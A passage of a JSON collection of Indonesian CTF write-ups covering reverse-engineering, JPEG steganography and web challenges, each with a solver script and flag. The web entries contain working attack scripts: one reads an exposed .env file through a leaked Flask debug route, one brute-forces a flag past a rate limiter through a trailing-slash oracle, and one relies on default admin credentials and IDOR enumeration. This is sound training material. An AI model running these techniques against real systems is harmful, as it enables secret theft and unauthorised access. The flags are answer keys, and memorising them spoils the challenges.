        "content": "Di `buildOverrideToken()` terlihat komponen ini:\n\n- alphabet: `ABCDEFGHJKLMNPQRSTUVWXYZ23456789`\n- array `spice[10]`:\n  - `0x13, 0x37, 0xc0de, 0xbeef, 0x5a, 0xace, 0x4242, 0x900d, 0x1234, 0x777`\n- seed awal: `roomSignature() ^ 0x6f70656e` (`\"open\"`)\n- loop 10x:\n  - `seed = seed * 0x19660d + spice[i] + 0x3c6ef35f` (mod 32-bit)\n  - karakter diambil dari `alphabet[seed >> 27]`\n  - setelah index 2 dan 5 ditambah separator `-`\n\nDengan state ruangan yang sudah benar, token yang keluar:\n\n- `RHY-QVT-KAXJ`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import process\r\nimport re\r\n\r\nALPHABET = \"ABCDEFGHJKLMNPQRSTUVWXYZ23456789\"\r\nSPICE = [0x13, 0x37, 0xC0DE, 0xBEEF, 0x5A, 0x0ACE, 0x4242, 0x900D, 0x1234, 0x777]\r\n\r\n\r\ndef rol32(x: int, r: int) -> int:\r\n    x &= 0xFFFFFFFF\r\n    return ((x << r) & 0xFFFFFFFF) | (x >> (32 - r))\r\n\r\n\r\ndef build_token() -> str:\r\n    # Final state yang dibutuhkan dari roomAligned + maintenance checks:\r\n    # lights=OFF, vent=1, camera=3, patch=2, battery=1, mirror=1, hush=1\r\n    lights = 0\r\n    vent = 1\r\n    cam = 3\r\n    patch = 2\r\n    battery = 1\r\n    mirror = 1\r\n    hush = 1\r\n\r\n    sig = 0xA17C3E29\r\n    sig ^= 0x13579BDF if lights else 0x2468ACE0\r\n    sig = rol32(sig, 7)\r\n    sig = (sig + ((vent + 1) * 0x1F123BB5)) & 0xFFFFFFFF\r\n    sig ^= ((cam + 3) * 0x045D9F3B) & 0xFFFFFFFF\r\n    sig = (sig + ((patch + 5) * 0x27D4EB2D)) & 0xFFFFFFFF\r\n    sig ^= 0xA5A55A5A if battery else 0x5A5AA5A5\r\n    sig = (sig + (0x31415926 if mirror else 0x27182818)) & 0xFFFFFFFF\r\n    sig ^= 0xDEADBEEF if hush else 0xBAD0C0DE\r\n\r\n    seed = sig ^ 0x6F70656E  # xor 'open'\r\n    out = []\r\n    for i, s in enumerate(SPICE):\r\n        seed = (seed * 0x19660D + s + 0x3C6EF35F) & 0xFFFFFFFF\r\n        out.append(ALPHABET[seed >> 27])\r\n        if i in (2, 5):\r\n            out.append(\"-\")\r\n    return \"\".join(out)\r\n\r\n\r\ndef send_menu(io, choice: str):\r\n    io.sendlineafter(b\"> \", choice.encode())\r\n\r\n\r\ndef main():\r\n    token = build_token()  # RHY-QVT-KAXJ\r\n    io = process(\"./escaperoom\")\r\n\r\n    # Stage room state\r\n    send_menu(io, \"2\")  # lights OFF\r\n    send_menu(io, \"3\")  # vent -> 1 (east bypass)\r\n    send_menu(io, \"4\")  # cam 1\r\n    send_menu(io, \"4\")  # cam 2\r\n    send_menu(io, \"4\")  # cam 3 (mirror relay)\r\n    send_menu(io, \"5\")  # patch 1\r\n    send_menu(io, \"5\")  # patch 2\r\n    send_menu(io, \"6\")  # battery engaged\r\n\r\n    # maintenance shell: mirror + hush\r\n    send_menu(io, \"7\")\r\n    io.sendlineafter(b\"svc> \", b\"mirror\")\r\n    io.sendlineafter(b\"svc> \", b\"hush\")\r\n    io.sendlineafter(b\"svc> \", b\"back\")\r\n\r\n    # submit token\r\n    send_menu(io, \"8\")\r\n    io.sendlineafter(b\"override token> \", token.encode())\r\n\r\n    data = io.recvrepeat(1.0).decode(errors=\"ignore\")\r\n    m = re.search(r\"CIT\\{[^}]+\\}\", data)\r\n    if not m:\r\n        print(\"Flag tidak ditemukan. Output terakhir:\")\r\n        print(data)\r\n        return\r\n\r\n    print(m.group(0))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{Vc282vlhCxIJ}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-rev-faultline",
    "title": "Faultline",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Writeup for challenge Faultline",
    "problemDescription": "Binary `faultline` adalah ELF 64-bit statically linked dan punya beberapa subcommand:\n\n- `score <PROFILE>`\n- `trace <PROFILE>`\n- `token <PROFILE>`\n- `submit <PROFILE> <TOKEN>`\n- `nudge <PROFILE> <INDEX> <DELTA>`\n- `compare <PROFILE_A> <PROFILE_B>`\n\nDari usage terlihat:\n\n- Alphabet profile: `BCDFGHJKLMNPQRST` (16 karakter)\n- Panjang profile: 12\n- Benchmark historis: 2026\n\nPetunjuk di `notes` menjelaskan ada 3 family constraint (`stress`, `shear`, `grain`) + `load` + `seal`.",
    "tools": [],
    "analysis": "Tes input valid termudah:\n\n- `BBBBBBBBBBBB` valid (karena `B` ada di alphabet)\n- `trace BBB...` memberi semua nol\n- `score BBB...` memberi `-1038`\n\nIni ngasih indikasi nilai internal profile adalah indeks karakter (0..15), dengan `B=0`.",
    "solution": [
      {
        "title": "Reverse Engineering",
        "content": "Dari simbol fungsi yang masih ada di binary:\n\n- `parseProfile`\n- `stressTrace`\n- `shearTrace`\n- `grainTrace`\n- `loadMetric`\n- `sealMetric`\n- `computeFaultlineScoreVisible`\n- `buildSurveyTokenVisible`\n\nKonversi profile jelas: setiap karakter dicari index-nya di alphabet `BCDFGHJKLMNPQRST`."
      },
      {
        "title": "Formula yang didapat",
        "content": "Misal profile diubah jadi array `a[0..11]` (tiap elemen 0..15):\n\n1. Stress (11 nilai)\n\n`stress[i] = (2*a[i] + 3*a[i+1]) & 0xf`\n\n2. Shear (10 nilai)\n\n`shear[i] = a[i] ^ a[i+2]`\n\n3. Grain (9 nilai)\n\n`grain[i] = (a[i] + a[i+3] - a[i+1]) & 0xf`\n\n4. Load\n\n`load = sum(a[i])`\n\n5. Seal\n\n`seal = (sum((i+5)*a[i])) & 0xf`\n\nArray observasi (`OBS_*`) hardcoded di `.rodata`:\n\n- `OBS_STRESS = [2,5,11,10,5,1,13,4,3,3,14]`\n- `OBS_SHEAR  = [5,5,15,8,5,6,7,4,5,5]`\n- `OBS_GRAIN  = [3,11,3,4,14,4,5,6,1]`\n- target `load = 93`\n- target `seal = 9`\n\n`computeFaultlineScoreVisible` memberi bonus maksimal saat semua cocok persis; nilai maksimum tepat jadi `2026`."
      },
      {
        "title": "Cara Solve",
        "content": "Kunci paling enak dipakai: persamaan shear.\n\nDari `shear[i] = a[i] ^ a[i+2]` =>\n\n`a[i+2] = a[i] ^ OBS_SHEAR[i]`\n\nArtinya cukup brute-force `a0` dan `a1` (16x16 = 256 kemungkinan), sisanya terbangun deterministik. Setelah itu tinggal filter dengan stress + grain + load + seal.\n\nHasil unik:\n\n`[14, 2, 11, 7, 4, 15, 1, 9, 6, 13, 3, 8]`\n\nMapping ke alphabet `BCDFGHJKLMNPQRST` menghasilkan profile:\n\n`SDPKGTCMJRFL`\n\nValidasi:\n\n- `./faultline score SDPKGTCMJRFL` -> `2026 (catastrophic resonance lock)`\n- `./faultline token SDPKGTCMJRFL` -> `Z2L-2F5-BUBP`\n- `./faultline submit SDPKGTCMJRFL Z2L-2F5-BUBP` -> `CIT{12z4PXVTa3x3}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\n\r\nALPHABET = \"BCDFGHJKLMNPQRST\"\r\nOBS_STRESS = [2, 5, 11, 10, 5, 1, 13, 4, 3, 3, 14]\r\nOBS_SHEAR = [5, 5, 15, 8, 5, 6, 7, 4, 5, 5]\r\nOBS_GRAIN = [3, 11, 3, 4, 14, 4, 5, 6, 1]\r\nTARGET_LOAD = 93\r\nTARGET_SEAL = 9\r\n\r\n\r\ndef run_cmd(args):\r\n    return subprocess.check_output(args, text=True).strip()\r\n\r\n\r\ndef find_profile_vals():\r\n    # Dari shear: a[i+2] = a[i] ^ OBS_SHEAR[i], jadi cukup brute-force a0 dan a1.\r\n    for a0 in range(16):\r\n        for a1 in range(16):\r\n            a = [0] * 12\r\n            a[0], a[1] = a0, a1\r\n\r\n            for i in range(10):\r\n                a[i + 2] = a[i] ^ OBS_SHEAR[i]\r\n\r\n            ok = True\r\n\r\n            # stress[i] = (2*a[i] + 3*a[i+1]) & 0xf\r\n            for i in range(11):\r\n                if ((2 * a[i] + 3 * a[i + 1]) & 0xF) != OBS_STRESS[i]:\r\n                    ok = False\r\n                    break\r\n            if not ok:\r\n                continue\r\n\r\n            # grain[i] = (a[i] + a[i+3] - a[i+1]) & 0xf\r\n            for i in range(9):\r\n                if ((a[i] + a[i + 3] - a[i + 1]) & 0xF) != OBS_GRAIN[i]:\r\n                    ok = False\r\n                    break\r\n            if not ok:\r\n                continue\r\n\r\n            if sum(a) != TARGET_LOAD:\r\n                continue\r\n\r\n            seal = sum((i + 5) * a[i] for i in range(12)) & 0xF\r\n            if seal != TARGET_SEAL:\r\n                continue\r\n\r\n            return a\r\n\r\n    raise RuntimeError(\"Profile tidak ditemukan\")\r\n\r\n\r\ndef vals_to_profile(vals):\r\n    return \"\".join(ALPHABET[v] for v in vals)\r\n\r\n\r\ndef main():\r\n    vals = find_profile_vals()\r\n    profile = vals_to_profile(vals)\r\n\r\n    score_out = run_cmd([\"./faultline\", \"score\", profile])\r\n    token = run_cmd([\"./faultline\", \"token\", profile])\r\n    submit_out = run_cmd([\"./faultline\", \"submit\", profile, token])\r\n\r\n    m = re.search(r\"CIT\\{[^}]+\\}\", submit_out)\r\n\r\n    print(f\"[+] profile : {profile}\")\r\n    print(f\"[+] score   : {score_out}\")\r\n    print(f\"[+] token   : {token}\")\r\n    print(f\"[+] submit  : {submit_out}\")\r\n\r\n    if m:\r\n        print(f\"[+] flag    : {m.group(0)}\")\r\n    else:\r\n        raise RuntimeError(\"Flag tidak ditemukan di output submit\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{12z4PXVTa3x3}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-rev-saymyame",
    "title": "- Say My Name (rev)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Challenge ini berupa satu file ELF 64-bit bernama `saymyname`.",
    "problemDescription": "Challenge ini berupa satu file ELF 64-bit bernama `saymyname`.",
    "tools": [],
    "analysis": "Langkah pertama yang saya lakukan:\n\n```bash\nls -la\nfile saymyname\n```\n\nHasil penting:\n- Binary ELF 64-bit, statically linked\n- Tidak di-strip (simbol masih ada), jadi reversing jadi jauh lebih mudah\n\nProgram saat dijalankan menampilkan:\n\n```text\nSay My Name.\nName:\n```\n\nKalau input salah, output:\n\n```text\nnah wrong guy\n```",
    "solution": [
      {
        "title": "2. Cari petunjuk dari simbol dan string",
        "content": "Saya cek simbol dan string yang relevan:\n\n\n\nDari sini terlihat:\n- Ada fungsi `main`\n- Ada fungsi `validate`\n- Ada string flag yang terlihat di binary\n\nKarena challenge rev, string flag saja belum cukup. Saya tetap validasi alur program untuk memastikan cara mendapatkannya benar.",
        "code": "readelf -sW saymyname | rg ' main$|validate|flag|name'\nstrings -n 4 saymyname | rg 'Say My Name|wrong|flag|CIT\\{'"
      },
      {
        "title": "3. Reversing fungsi main",
        "content": "Saya disassemble `main`:\n\n\n\nDari disassembly terlihat pola berikut:\n1. Program print banner dan prompt\n2. Input dibaca dengan `getline`\n3. Input dibandingkan dengan string konstan di address `.rodata` (`0x576d00`)\n4. Jika sama, panggil `validate` lalu print hasilnya\n5. Jika beda, print `nah wrong guy`\n\nBerarti kunci challenge adalah menemukan string pembanding di `.rodata`.",
        "code": "objdump -d --no-show-raw-insn -Mintel saymyname --start-address=0x407e0e --stop-address=0x408100"
      },
      {
        "title": "4. Ambil string nama yang benar dari .rodata",
        "content": "Saya dump rodata di sekitar alamat yang dipakai `main`:\n\n\n\nDidapat string nama target:\n\n\n\nDi area yang sama terlihat juga string sukses yang memuat flag.",
        "code": "objdump -s --start-address=0x576ce0 --stop-address=0x576e20 saymyname"
      },
      {
        "title": "5. Validasi runtime",
        "content": "Saya jalankan binary dengan nama tersebut:\n\n\n\nInput:\n\n\n\nOutput sukses:\n\n\n\nJadi flag tervalidasi dari jalur eksekusi program.",
        "code": "./saymyname"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\nBINARY = Path(__file__).with_name(\"saymyname\")\r\nTARGET_NAME = \"Bartholomew Demetrius Jamarion Kensington Blackwood Montague Devereaux Jackson-Fitzwilliam the XXVII\"\r\n\r\n\r\ndef main() -> None:\r\n    if not BINARY.exists():\r\n        raise SystemExit(\"Binary 'saymyname' tidak ditemukan di direktori ini\")\r\n\r\n    proc = subprocess.run(\r\n        [str(BINARY)],\r\n        input=TARGET_NAME + \"\\n\",\r\n        text=True,\r\n        capture_output=True,\r\n        check=False,\r\n    )\r\n\r\n    output = proc.stdout + proc.stderr\r\n    match = re.search(r\"CIT\\{[^}]+\\}\", output)\r\n    if not match:\r\n        print(output, end=\"\")\r\n        raise SystemExit(\"Flag tidak ditemukan dari output binary\")\r\n\r\n    print(match.group(0))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{Zn583Umnwd4S}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-stegano-arreyowinningson",
    "title": "- Are ya winning, son?",
    "category": "Stegano",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Kategori challenge ini `misc`, tapi artefaknya berupa gambar `chall.jpg`, jadi pendekatan paling masuk akal adalah stegano/forensics file JPEG.",
    "problemDescription": "Kategori challenge ini `misc`, tapi artefaknya berupa gambar `chall.jpg`, jadi pendekatan paling masuk akal adalah stegano/forensics file JPEG.",
    "tools": [],
    "analysis": "Pertama cek isi folder:\n\n```bash\nls -la\n```\n\nHanya ada satu file: `chall.jpg`.\n\nLalu cek metadata:\n\n```bash\nfile chall.jpg\nexiftool chall.jpg\n```\n\nHasilnya normal untuk JPEG (800x800), tidak ada EXIF aneh atau comment mencurigakan.",
    "solution": [
      {
        "title": "2. Cari anomali struktur JPEG",
        "content": "Lanjut cek dengan decoder JPEG verbose:\n\n\n\nMuncul indikator penting:\n\n- `Corrupt JPEG data: 8462 extraneous bytes before marker 0xd9`\n\nArtinya ada 8462 byte tambahan tepat sebelum marker akhir JPEG (`FFD9`). Ini red flag banget buat stego model \"nyelipin data di entropy stream\".\n\nCross-check pakai `jpegtran`:\n\n\n\n`clean.jpg` jadi lebih kecil, menandakan byte tambahan memang dibuang saat normalisasi.",
        "code": "djpeg -verbose chall.jpg >/tmp/djpeg.ppm 2>/tmp/djpeg.err\ncat /tmp/djpeg.err"
      },
      {
        "title": "3. Hipotesis dan validasi",
        "content": "Hipotesis: byte tambahan itu bukan noise random, tapi scan-data JPEG lain yang bisa dirender kalau dipasangkan dengan header yang sama.\n\nLangkah validasi:\n\n1. Parse struktur JPEG sampai marker `SOS` (start of scan).\n2. Ambil entropy scan data dari setelah SOS sampai sebelum EOI.\n3. Cari awal segmen tambahan (di challenge ini kelihatan jelas diawali run panjang pola `05 14 51 40`).\n4. Bangun file JPEG baru:\n   - pakai header asli sampai `SOS`\n   - pakai segmen tambahan tadi sebagai scan data\n   - tutup dengan `FFD9`\n\nWaktu file hasil (`alt.jpg`) dibuka, langsung muncul teks flag di gambar tersembunyi."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\nJPEG_SOI = b\"\\xff\\xd8\"\r\nJPEG_EOI = b\"\\xff\\xd9\"\r\nPATTERN = bytes.fromhex(\"05145140\")\r\n\r\n\r\ndef parse_sos_end(jpeg: bytes) -> int:\r\n    if not jpeg.startswith(JPEG_SOI):\r\n        raise ValueError(\"Bukan file JPEG valid (SOI tidak ditemukan)\")\r\n\r\n    i = 2\r\n    n = len(jpeg)\r\n    while i < n:\r\n        if jpeg[i] != 0xFF:\r\n            i += 1\r\n            continue\r\n\r\n        while i < n and jpeg[i] == 0xFF:\r\n            i += 1\r\n        if i >= n:\r\n            break\r\n\r\n        marker = jpeg[i]\r\n        i += 1\r\n\r\n        if marker == 0xD9:\r\n            break\r\n\r\n        if marker in (0x01,) or 0xD0 <= marker <= 0xD7:\r\n            continue\r\n\r\n        if i + 2 > n:\r\n            raise ValueError(\"Marker length rusak\")\r\n\r\n        seg_len = int.from_bytes(jpeg[i : i + 2], \"big\")\r\n\r\n        if marker == 0xDA:  # Start Of Scan\r\n            return i + seg_len\r\n\r\n        i += seg_len\r\n\r\n    raise ValueError(\"Marker SOS tidak ditemukan\")\r\n\r\n\r\ndef find_extraneous_start(scan_data: bytes) -> int:\r\n    # Payload tersembunyi diawali run pattern 05 14 51 40 yang panjang.\r\n    # Cari run minimal 64 kali (256 byte) agar tidak false positive.\r\n    need = PATTERN * 64\r\n    idx = scan_data.find(need)\r\n    if idx == -1:\r\n        raise ValueError(\"Tidak menemukan awal extraneous payload\")\r\n    return idx\r\n\r\n\r\ndef extract_flag_from_image(image_path: Path) -> str:\r\n    # Pakai tesseract CLI karena tersedia di environment challenge.\r\n    proc = subprocess.run(\r\n        [\"tesseract\", str(image_path), \"stdout\"],\r\n        capture_output=True,\r\n        text=True,\r\n        check=False,\r\n    )\r\n\r\n    ocr_text = (proc.stdout or \"\") + \"\\n\" + (proc.stderr or \"\")\r\n    m = re.search(r\"CIT\\{[^}\\n]+\\}\", ocr_text)\r\n    if not m:\r\n        raise ValueError(\"Flag tidak terdeteksi dari OCR\")\r\n    return m.group(0)\r\n\r\n\r\ndef main() -> None:\r\n    chall = Path(\"chall.jpg\")\r\n    if not chall.exists():\r\n        raise SystemExit(\"chall.jpg tidak ditemukan di folder ini\")\r\n\r\n    b = chall.read_bytes()\r\n    eoi = b.rfind(JPEG_EOI)\r\n    if eoi == -1:\r\n        raise SystemExit(\"EOI JPEG tidak ditemukan\")\r\n\r\n    sos_end = parse_sos_end(b)\r\n    scan_data = b[sos_end:eoi]\r\n\r\n    extra_start = find_extraneous_start(scan_data)\r\n    extra = scan_data[extra_start:]\r\n\r\n    alt = b[:sos_end] + extra + JPEG_EOI\r\n    alt_path = Path(\"recovered_hidden.jpg\")\r\n    alt_path.write_bytes(alt)\r\n\r\n    flag = extract_flag_from_image(alt_path)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{pls_d0nt_b3_l1k3_th1s_guy}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-web-debugdisaster",
    "title": "Debug Disaster",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Writeup for challenge Debug Disaster",
    "problemDescription": "Challenge ini sengaja membiarkan Flask berjalan dalam mode debug di production. Dari situ traceback Werkzeug menampilkan potongan source code route handler, dan ternyata ada endpoint tersembunyi yang membaca file `.env` secara langsung.\n\nFlag didapat tanpa brute force berat atau RCE debugger, cukup dari information disclosure.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Target",
        "content": "- URL: `http://23.179.17.92:5002`\n- Kategori: Web / Misc\n- Fingerprint awal:\n  - Header server: `Werkzeug/3.1.8 Python/3.11.15`\n  - Halaman `/` hanya menampilkan: `Welcome to Startup Portal`"
      },
      {
        "title": "Langkah Eksploitasi",
        "content": "1. Enumerasi endpoint sederhana.\n   - Hasil menarik: `/admin` ada dan merespons `500` (bukan `404`).\n\n2. Buka `/admin` dan baca debug traceback Werkzeug.\n   - Di traceback, source snippet dari `/app/app.py` terlihat jelas:\n     - Route `/admin` sengaja `raise Exception(...)`\n     - Ada route lain: `/flg_bar`\n     - Fungsi route itu melakukan `open(\".env\").read()` dan mengembalikannya sebagai plaintext.\n\n3. Akses endpoint tersembunyi `/flg_bar`.\n   - Response berisi isi file `.env`, termasuk variabel `FLAG`."
      },
      {
        "title": "Bukti Request",
        "content": "Contoh output:",
        "code": "curl -s http://23.179.17.92:5002/flg_bar"
      },
      {
        "title": "Dampak Kerentanan",
        "content": "- Debug mode aktif di production menyebabkan source/path internal bocor.\n- Endpoint internal yang seharusnya tidak ada (`/flg_bar`) masih tertinggal.\n- Sensitive file exposure: `.env` dapat diakses publik melalui route."
      },
      {
        "title": "Rekomendasi Perbaikan",
        "content": "1. Matikan debug mode di production (`debug=False`).\n2. Hapus route debug/development sebelum deploy.\n3. Jangan pernah expose isi `.env` lewat endpoint HTTP.\n4. Tambahkan CI check untuk mencegah route/fitur debug ikut ter-deploy."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport sys\r\nimport requests\r\n\r\nBASE = sys.argv[1] if len(sys.argv) > 1 else \"http://23.179.17.92:5002\"\r\nBASE = BASE.rstrip(\"/\")\r\n\r\n\r\ndef main() -> int:\r\n    s = requests.Session()\r\n\r\n    # Trigger debug traceback first (optional, but useful for validation)\r\n    r = s.get(f\"{BASE}/admin\", timeout=10)\r\n    if r.status_code != 500:\r\n        print(f\"[!] Unexpected /admin status: {r.status_code}\")\r\n    else:\r\n        print(\"[+] /admin returns 500 debug page (as expected)\")\r\n\r\n    # Hidden endpoint leaked in traceback source preview\r\n    r = s.get(f\"{BASE}/flg_bar\", timeout=10)\r\n    if r.status_code != 200:\r\n        print(f\"[!] Failed to fetch /flg_bar, status={r.status_code}\")\r\n        return 1\r\n\r\n    body = r.text\r\n    print(\"[+] /flg_bar response:\\n\")\r\n    print(body)\r\n\r\n    m = re.search(r\"FLAG\\s*=\\s*(.+)\", body)\r\n    if not m:\r\n        print(\"[!] FLAG not found in response\")\r\n        return 1\r\n\r\n    flag = m.group(1).strip()\r\n    print(f\"\\n[+] FLAG: {flag}\")\r\n    print(f\"\\n<FLAG>{flag}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{H1dd3n_D1r5_3v3rywh3r3}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-web-hityourlimit",
    "title": "- Hit Your Limit (Web Misc)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Writeup for challenge - Hit Your Limit (Web Misc)",
    "problemDescription": "Aplikasi menyediakan endpoint validasi flag per prefix:\n- Endpoint normal: `/api/flag?guess=...`\n- Jika prefix benar: status `200`\n- Jika salah: status non-`200`\n- Ada rate limit ketat: `5 request / ~300 detik` (status `429`)\n\nMasalah utama challenge ini bukan brute force biasa, tapi mencari cara melewati limiter.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Nama: `Hit Your Limit`\n- Kategori: `web misc`\n- URL: `http://23.179.17.92:5559`"
      },
      {
        "title": "Tahap Recon",
        "content": "Pertama saya lihat source halaman utama pakai `curl`, lalu ketemu JavaScript berikut (inti logic):\n- frontend memanggil `fetch('/api/flag?guess=...')`\n- status `200` dianggap `correct prefix`\n- status `429` dianggap `rate limited`\n\nSetelah itu saya spam request ke endpoint normal dan benar muncul limiter:\n- response JSON menampilkan `\"limit\": 5`\n- `message` berisi `Retry in ...s`\n\nSaya juga coba bypass umum:\n- spoof IP header (`X-Forwarded-For`, `X-Real-IP`, `CF-Connecting-IP`, dll)\n- ganti method (`POST`, `HEAD`, `OPTIONS`)\n- ganti cookie\n- manipulasi host/header lain\n\nSemua tetap kena `429`."
      },
      {
        "title": "Temuan Vulnerability",
        "content": "Saat uji variasi path, ada behavior menarik:\n- `/api/flag?guess=a` -> `429`\n- `/api/flag/?guess=a` -> kadang `500`, kadang tetap diproses\n\nSetelah dicek lebih teliti:\n- Endpoint **trailing slash** (`/api/flag/`) ternyata bisa menjadi oracle.\n- Pada endpoint ini:\n  - tebakan prefix benar -> `200`\n  - tebakan salah -> `500`\n- Dan yang paling penting: endpoint ini bisa dipakai untuk brute force karakter tanpa mentok limiter seperti endpoint normal.\n\nJadi bug-nya adalah perbedaan handling route `/api/flag` vs `/api/flag/` yang membuat limiter/logic error bisa dibypass."
      },
      {
        "title": "Strategi Eksploitasi",
        "content": "Karena flag panjangnya 32 karakter, langkahnya:\n1. mulai dari prefix yang sudah terkonfirmasi: `CIT{`\n2. untuk setiap posisi berikutnya, coba semua karakter printable (`chr(32..126)`)\n3. kirim request ke `/api/flag/?guess=<prefix+candidate>`\n4. jika status `200`, candidate benar -> append ke prefix\n5. ulangi sampai panjang 32\n\nAgar cepat, setiap posisi dites paralel dengan thread pool."
      },
      {
        "title": "Catatan Teknis",
        "content": "- Kenapa endpoint salah bisa `500`? Kemungkinan ada exception handler yang menutup error internal jadi JSON generic.\n- Meskipun `500`, perbedaan status (`200` vs `500`) tetap cukup sebagai side-channel oracle.\n- Ini contoh klasik bug kombinasi:\n  - route inconsistency\n  - rate-limiter scope tidak konsisten\n  - oracle berbasis status code"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport string\r\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\r\n\r\nimport requests\r\n\r\n\r\ndef build_charset(mode: str) -> str:\r\n    if mode == \"ctf\":\r\n        return string.ascii_letters + string.digits + \"{}_@-!$\"\r\n    if mode == \"printable\":\r\n        return \"\".join(chr(i) for i in range(32, 127))\r\n    raise ValueError(\"Unknown charset mode\")\r\n\r\n\r\ndef check_prefix(base_url: str, guess: str, timeout: int) -> int | None:\r\n    try:\r\n        r = requests.get(base_url, params={\"guess\": guess}, timeout=timeout)\r\n        return r.status_code\r\n    except requests.RequestException:\r\n        return None\r\n\r\n\r\ndef solve(base_url: str, initial_prefix: str, target_len: int, charset: str, workers: int, timeout: int) -> str:\r\n    prefix = initial_prefix\r\n    print(f\"[+] Start prefix: {prefix}\")\r\n\r\n    while len(prefix) < target_len:\r\n        found = None\r\n        with ThreadPoolExecutor(max_workers=workers) as pool:\r\n            future_to_char = {\r\n                pool.submit(check_prefix, base_url, prefix + ch, timeout): ch for ch in charset\r\n            }\r\n            for fut in as_completed(future_to_char):\r\n                code = fut.result()\r\n                if code == 200:\r\n                    found = future_to_char[fut]\r\n                    break\r\n\r\n        if found is None:\r\n            raise RuntimeError(\r\n                f\"Tidak menemukan karakter valid di panjang {len(prefix)}. Prefix saat ini: {prefix!r}\"\r\n            )\r\n\r\n        prefix += found\r\n        print(f\"[+] {prefix}\")\r\n\r\n    return prefix\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(description=\"Solver Hit Your Limit\")\r\n    parser.add_argument(\r\n        \"--url\",\r\n        default=\"http://23.179.17.92:5559/api/flag/\",\r\n        help=\"Endpoint bypass (default: /api/flag/)\",\r\n    )\r\n    parser.add_argument(\"--prefix\", default=\"CIT{\", help=\"Prefix awal\")\r\n    parser.add_argument(\"--length\", type=int, default=32, help=\"Panjang flag\")\r\n    parser.add_argument(\"--workers\", type=int, default=48, help=\"Jumlah worker paralel\")\r\n    parser.add_argument(\"--timeout\", type=int, default=10, help=\"Timeout request per tebakan\")\r\n    parser.add_argument(\r\n        \"--charset\",\r\n        choices=[\"ctf\", \"printable\"],\r\n        default=\"printable\",\r\n        help=\"Mode charset\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    charset = build_charset(args.charset)\r\n    flag = solve(args.url, args.prefix, args.length, charset, args.workers, args.timeout)\r\n    print(f\"\\n[!] FLAG: {flag}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{R@T3_L1m1t1nG_15_Bypass@ble}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-web-internalportal",
    "title": "- Intern Portal (Web Misc)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Writeup for challenge - Intern Portal (Web Misc)",
    "problemDescription": "Challenge ini rentan pada **broken access control**:\n1. Kredensial lemah/default (`admin:admin`) masih aktif.\n2. Endpoint report memakai parameter `id` yang bisa diakses lintas user (**IDOR / missing authorization check**).\n\nDengan login sebagai admin dan enumerasi `id` report, flag bisa diambil dari report milik user lain.",
    "tools": [],
    "analysis": "Lakukan brute force ID secara bertahap (misal 1..5000), parse konten report, lalu cari pola flag `CIT{...}`.\n\nFlag ditemukan pada:\n- `report id = 347`\n- konten: `CIT{Acc355_C0ntr0l_M@tt3rs!}`",
    "solution": [
      {
        "title": "Informasi Target",
        "content": "- URL: `http://23.179.17.92:5001`\n- Halaman awal redirect ke `/login`\n- Endpoint penting:\n  - `POST /login`\n  - `POST /register`\n  - `GET /` (dashboard)\n  - `POST /report` (buat report)\n  - `GET /report?id=<id>` (lihat report berdasarkan ID)"
      },
      {
        "title": "1. Recon awal",
